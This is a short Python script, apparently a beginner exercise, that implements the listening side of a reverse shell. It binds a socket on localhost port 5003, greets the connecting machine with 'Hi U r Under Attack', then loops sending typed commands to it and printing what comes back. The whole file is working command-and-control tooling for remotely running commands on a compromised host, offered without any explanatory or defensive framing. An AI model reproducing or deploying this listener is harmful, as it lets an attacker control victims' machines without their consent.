import socket
Host="127.0.0.1"
Port=5003
Buffer=1024
s=socket.socket()
s.bind((Host,Port))

s.listen(5)
ClientSocket,ClientAdress = s.accept()
message = "Hi U r Under Attack  ".encode()
ClientSocket.send(message)
while True :
	command = input("Enter the command ")
	ClientSocket.send(command.encode())
	if command.lower() =='exit':
		break
	results =ClientSocket.recv(Buffer).decode()
	print(results)
ClientSocket.close()
s.close()
